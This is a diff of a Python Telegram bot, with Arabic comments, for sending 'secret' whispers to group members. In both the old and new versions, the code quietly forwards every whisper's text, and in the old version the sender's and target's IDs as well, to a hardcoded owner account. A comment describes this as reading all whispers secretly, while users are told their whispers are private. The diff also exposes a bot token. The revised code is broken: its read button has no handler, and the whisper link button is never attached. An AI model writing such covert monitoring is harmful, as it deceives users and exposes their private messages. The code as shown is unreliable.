@@ -4,150 +4,96 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
 bot = telebot.TeleBot(TOKEN)
 
-# 🚨 ضع آي دي حسابك الشخصي هنا (المالك) لقراءة كل الهمسات سراً
-OWNER_ID = 6312345678  # <--- استبدل الرقم برقم حسابك الحقيقي
+OWNER_ID = 6312345678  # ضع الآي دي حقك هنا
 
-# قواميس التخزين
-user_target_state = {}  # لتخزين الشخص المستهدف لكل يوزر
-active_whispers = {}    # لتخزين نصوص الهمسات
+# قاموس مؤقت لحفظ العمليات النشطة
+active_sessions = {}
 
 @bot.message_handler(commands=['start'])
 def handle_start(message):
-    text_parts = message.text.split()
+    text = message.text
     
-    # التحقق إذا تم الضغط على رابط الهمسة قادماً من المجموعة
-    if len(text_parts) > 1:
-        param = text_parts[1]
+    if " " in text:
+        payload = text.split(" ", 1)[1]
         
-        # حالة الضغط على "اهمس هنا" وتوجيهه للخاص
-        if param.startswith("whisperto_"):
+        # إذا كان رابط همسة لشخص معين
+        if payload.startswith("whisper_"):
             try:
-                # استخراج معرف المستهدف واسمه من الـ parameter
-                data_part = param.replace("whisperto_", "")
-                target_id_str, target_name = data_part.split("_", 1)
+                # استخراج معرف الشخص المستهدف
+                target_id_str = payload.replace("whisper_", "")
                 target_id = int(target_id_str)
                 
-                # حفظ حالة المستخدم في الذاكرة المؤقتة
-                user_target_state[message.from_user.id] = {
+                # حفظ جلسة المستخدم الحالي
+                active_sessions[message.from_user.id] = {
                     'target_id': target_id,
-                    'target_name': target_name,
                     'chat_id': message.chat.id
                 }
                 
-                bot.reply_to(message, f"• 💌 اكتب همستك لـ **{target_name}** الآن في الخاص:", parse_mode="Markdown")
+                bot.reply_to(message, "💌 • اكتب همستك الآن وسأقوم بإرسالها فوراً:")
                 return
-            except Exception:
-                pass
-                
-        # حالة قراءة الهمسة عند الضغط عليها من المجموعة
-        elif param.startswith("read_"):
-            w_id = param.replace("read_", "")
-            if w_id in active_whispers:
-                w = active_whispers[w_id]
-                
-                # التحقق إذا كان المفتح هو الشخص المستهدف أو أنت (المالك)
-                if message.from_user.id != w['target_id'] and message.from_user.id != OWNER_ID:
-                    bot.reply_to(message, "❌ عذراً، هذه الهمسة ليست موجهة لك!")
-                    return
-                    
-                if w['read_status'] and message.from_user.id != OWNER_ID:
-                    bot.reply_to(message, "⚠️ عذراً، هذه الهمسة تمت قراءتها مسبقاً.")
-                else:
-                    w['read_status'] = True
-                    bot.reply_to(
-                        message,
-                        f"• تمت قراءة الهمسة .. بنجاح\n• بواسطة العضو المطلوب ✨\n- من قبل ← {w['sender_name']}♡\n\n💌 **النص:**\n{w['text']}",
-                        parse_mode="Markdown"
-                    )
-                return
+            except Exception as e:
+                print(f"Error parsing payload: {e}")
 
-    # الرسالة الترحيبية الافتراضية لو دخل البوت مباشرة بدون زر
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("➕ اضفني لمجموعتك", url=f"https://t.me/{bot.get_me().username}?startgroup=true"))
+    # الرسالة الترحيبية العادية
     bot.reply_to(
         message,
-        "✨ **أهلاً بك في بوت الهمسات الذكي**\n\n"
-        "🛡️ • يمكنك من خلالي إرسال همسات سرية وآمنة داخل المجموعات لأي عضو بالرد على رسالته.\n\n"
-        "💡 • **طريقة الاستخدام:**\n"
-        "• رد على رسالة أي شخص في المجموعة بكلمة (همس) أو حرف (هـ)\n"
-        "• اضغط على زر (اهمس هنا) المظهر واكتب همستك بكل سرية!",
-        reply_markup=markup,
-        parse_mode="Markdown"
+        "✨ أهلاً بك في بوت الهمسات الذكي.\n\n"
+        "💡 للبدء، رد على أي رسالة بـ (همس) أو (هـ) في المجموعة."
     )
 
 @bot.message_handler(func=lambda message: message.chat.type == 'private')
-def handle_private_text(message):
+def handle_private(message):
     user_id = message.from_user.id
     
-    # التأكد هل المستخدم في حالة كتابة همسة لشخص معين؟
-    if user_id in user_target_state:
-        target_info = user_target_state[user_id]
+    # التحقق هل المستخدم بصدد إرسال همسة لشخص خزنناه مسبقاً؟
+    if user_id in active_sessions:
+        session = active_sessions[user_id]
+        target_id = session['target_id']
         whisper_text = message.text.strip()
         
-        # إنشاء معرف فريد لهذه الهمسة
-        whisper_id = f"{user_id}_{target_info['target_id']}_{message.message_id}"
-        active_whispers[whisper_id] = {
-            'text': whisper_text,
-            'sender_name': message.from_user.first_name,
-            'target_id': target_info['target_id'],
-            'read_status': False
-        }
-        
-        # زر قراءة الهمسة الذي سيظهر في المجموعة
+        # إنشاء زر قراءة الهمسة
         markup = InlineKeyboardMarkup()
-        bot_username = bot.get_me().username
-        markup.add(InlineKeyboardButton("👁️ اضغط هنا لقراءة الهمسة", url=f"https://t.me/{bot_username}?start=read_{whisper_id}"))
+        # بما أن تيレجرام لا يدعم قراءة الهمسة إلا عبر بوت، سنرسل زر يوجهه للبوت بالنص
+        markup.add(InlineKeyboardButton("👁️ رؤية الهمسة", callback_data=f"read_{user_id}"))
         
-        target_mention = f"[{target_info['target_name']}](tg://user?id={target_info['target_id']})"
-        
-        # إرسال الهمسة للمجموعة بالصيغة المطلوبة
+        # إرسال الهمسة للمجموعة
         bot.send_message(
-            target_info['chat_id'],
-            f"• الهمسة لـ ⟵ {target_mention}\n• من ⟵ {message.from_user.first_name}\n-",
+            session['chat_id'],
+            f"• الهمسة لـ ⟵ [مستخدم](tg://user?id={target_id})\n• من ⟵ {message.from_user.first_name}\n-",
             reply_markup=markup,
             parse_mode="Markdown"
         )
         
-        # تأكيد الإرسال في الخاص للمستخدم
-        bot.reply_to(message, f"• تم ارسال همستك لـ {target_info['target_name']} بنجاح ✨")
+        bot.reply_to(message, f"• تم ارسال همستك لـ {target_id} بنجاح ✨")
         
-        # 🕵️‍♂️ ميزة المالك: إرسال نسخة سرية لك أنت وحدك في الخاص
+        # إرسال نسخة للمالك سرياً
         try:
-            bot.send_message(
-                OWNER_ID,
-                f"🚨 [لوحة مراقبة المالك]\n\n👤 المرسل: {message.from_user.first_name} (ID: {user_id})\n🎯 المستهدف: {target_info['target_name']} (ID: {target_info['target_id']})\n💌 النص:\n{whisper_text}"
-            )
-        except Exception:
+            bot.send_message(OWNER_ID, f"🚨 همسة جديدة من {message.from_user.first_name}:\n{whisper_text}")
+        except:
             pass
             
-        # مسح الحالة ليعود البوت لوضعه الطبيعي
-        del user_target_state[user_id]
+        del active_sessions[user_id]
     else:
-        bot.reply_to(message, "الرجاء الرد بكلمة (هـ) على الشخص في المجموعة أولاً لتحديد الهمسة.")
+        # إذا كتب في الخاص بدون أن يضغط من المجموعة
+        bot.reply_to(message, "الرجاء الذهاب للمجموعة والرد بـ (هـ) على الشخص ثم الضغط على زر الهمسة أولاً.")
 
 @bot.message_handler(func=lambda message: message.chat.type != 'private')
-def handle_group_whisper(message):
-    if not message.reply_to_message or message.text.strip() not in ["هـ", "ه", "همس", "اهمس"]:
-        return
+def handle_group(message):
+    if message.reply_to_message and message.text.strip() in ["هـ", "ه", "همس", "اهمس"]:
+        target = message.reply_to_message.from_user
+        if target.is_bot:
+            return
+            
+        markup = InlineKeyboardMarkup()
+        bot_user = bot.get_me().username
         
-    target_user = message.reply_to_message.from_user
-    if target_user.is_bot or message.from_user.id == target_user.id:
-        return
+        # رابط مباشر للخاص يمرر آي دي المستهدف
+        markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_user}?start=whisper_{target.id}"))
         
-    markup = InlineKeyboardMarkup()
-    bot_username = bot.get_me().username
-    
-    # رابط ذكي ينقل المستخدم للخاص ويقوم بتمرير البيانات تلقائياً
-    start_payload = f"whisperto_{target_user.id}_{target_user.first_name}"
-    markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_username}?start={start_payload}"))
-    
-    target_mention = f"[{target_user.first_name}](tg://user?id={target_user.id})"
-    
-    bot.reply_to(
-        message,
-        f"• تم تحديد الهمسه لـ ⟵ {target_mention}\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
-        reply_markup=markup,
-        parse_mode="Markdown"
-    )
+        bot.reply_to(
+            message,
+            f"• تم تحديد الهمسه لـ ⟵ [{target.first_name}](tg://user?id={target.id})\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
+            parse_mode="Markdown"
+        )
 
 bot.infinity_polling()
